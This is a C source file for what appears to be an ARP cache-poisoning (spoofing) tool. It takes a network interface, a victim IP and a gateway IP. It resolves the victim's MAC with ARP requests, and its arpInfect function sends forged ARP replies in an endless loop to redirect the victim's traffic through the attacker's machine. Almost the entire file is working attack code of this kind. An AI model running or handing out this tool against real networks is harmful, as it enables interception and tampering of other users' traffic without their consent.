#include "my_spoof.h"

void usage() {
  printf("syntax: pcap_test <interface> <victim ip> <gateway ip>\n");
  printf("sample: pcap_test wlan0 192.168.13.100 192.168.0.1\n");
  printf("");
}

void findMyMac(char* dev,unsigned char *my_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, dev);
    if (!ioctl(fd, SIOCGIFHWADDR, &s)) {
        memcpy(my_mac, s.ifr_addr.sa_data, 6);
    }
}

void printMyMac(unsigned  char *my_mac){
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);    
}

int arpRequest(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, unsigned char *src_mac, unsigned char *dst_mac, unsigned short opcode){
    struct ether_header *eth_h;
    struct ether_arp *arp_h;

    char* packet = (char*) calloc(ETHERMTU, sizeof(char));
    memset(packet, 0, ETHERMTU);

    eth_h = (struct ether_header*) packet;
    memcpy(eth_h -> ether_dhost, dst_mac, 6);
    memcpy(eth_h -> ether_shost, src_mac, 6);
    eth_h -> ether_type = htons(ETHERTYPE_ARP);

    arp_h = (struct ether_arp*)(packet + 14);
    arp_h->arp_hrd = htons(0x01);
    arp_h->arp_pro = htons(ETHERTYPE_IP);
    arp_h->arp_hln = 0x06;
    arp_h->arp_pln = 0x04;
    arp_h->arp_op = htons(opcode);
    memcpy(arp_h -> arp_sha, src_mac, 6);
    memcpy(arp_h -> arp_spa, src_ip, 4);
    memcpy(arp_h->arp_tha, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(arp_h -> arp_tpa, dst_ip, 4);

    if(!pcap_sendpacket(handle, (const u_char*)packet, sizeof(struct ether_arp) + sizeof(struct ether_header))){
        free(packet);
        return 1;
        }
    else{
        free(packet);
        return 0;
    }
 }

u_char* getYourMac(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *src_mac){
	char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
            fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        }
        struct ether_header *eth_h;
        struct ether_arp *arp_h;

        char* make_packet = (char*) calloc(ETHERMTU, sizeof(char));
        memset(make_packet, 0, ETHERMTU);

        eth_h = (struct ether_header*) make_packet;
        memcpy(eth_h -> ether_dhost, "\xff\xff\xff\xff\xff\xff",  6);
        memcpy(eth_h -> ether_shost, src_mac, 6);
        eth_h -> ether_type = htons(ETHERTYPE_ARP);

        arp_h = (struct ether_arp*)(make_packet + 14);
        arp_h->arp_hrd = htons(0x01);
        arp_h->arp_pro = htons(ETHERTYPE_IP);
        arp_h->arp_hln = 0x06;
        arp_h->arp_pln = 0x04;
        arp_h->arp_op = htons(0x01);
        memcpy(arp_h -> arp_sha, src_mac, 6);
        memcpy(arp_h -> arp_spa, src_ip, 4);
        memcpy(arp_h->arp_tha,  "\x00\x00\x00\x00\x00\x00", 6);
        memcpy(arp_h -> arp_tpa, dst_ip, 4);

        while (1) {
        	static struct pcap_pkthdr* header;
        	static struct ether_header* eth_h;
        	static struct ether_arp* arp_h;
        	static const u_char* packet;
        	unsigned short eth_type;
         u_char * dst_mac;
         dst_mac = (u_char*) calloc(6, sizeof(u_char));
         if(!pcap_sendpacket(handle, (const u_char*)make_packet, sizeof(struct ether_arp) + sizeof(struct ether_header))){
                 printf("Packet Hello\n");
             }
         else{
            printf("Packet Bye\n");
        }
         int res = pcap_next_ex(handle, &header, &packet);
        	if (res == 0) continue;
        	if (res == -1 || res == -2) break;
        	eth_h = (struct ether_header*)packet;
        	eth_type = htons(eth_h -> ether_type);
        	if (eth_type == ETHERTYPE_ARP){
        		arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
        		if(!memcmp(dst_ip, arp_h->arp_spa, 4)){
        			 memcpy(dst_mac, arp_h->arp_sha, 6);
                            free(make_packet);
                            pcap_close(handle);
                            return dst_mac;
        		}

	        }
	}
}

void arpInfect(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *src_mac, unsigned char *dst_mac){
        struct ether_header *eth_h;
        struct ether_arp *arp_h;

        char* packet = (char*) calloc(ETHERMTU, sizeof(char));
        memset(packet, 0, ETHERMTU);

        eth_h = (struct ether_header*) packet;
        memcpy(eth_h -> ether_dhost, dst_mac, 6);
        memcpy(eth_h -> ether_shost, src_mac, 6);
        eth_h -> ether_type = htons(ETHERTYPE_ARP);

        arp_h = (struct ether_arp*)(packet + 14);
        arp_h->arp_hrd = htons(0x01);
        arp_h->arp_pro = htons(ETHERTYPE_IP);
        arp_h->arp_hln = 0x06;
        arp_h->arp_pln = 0x04;
        arp_h->arp_op = htons(0x02);
        memcpy(arp_h -> arp_sha, src_mac, 6);
        memcpy(arp_h -> arp_spa, src_ip, 4);
        memcpy(arp_h->arp_tha,  dst_mac, 6);
        memcpy(arp_h -> arp_tpa, dst_ip, 4);

        char errbuf[PCAP_ERRBUF_SIZE];
        int tmp;
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL){
    	   fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    	   exit(1);
    }
        while(true){
    	   if(!pcap_sendpacket(handle, (const u_char*)packet, sizeof(struct ether_arp) + sizeof(struct ether_header))){
            printf("ARP Send Success\n");
            sleep(1);
        }
        else{
            printf("ARP Send Fail\n");
            free(packet);
            exit(1);
        }
    }
    pcap_close(handle);
}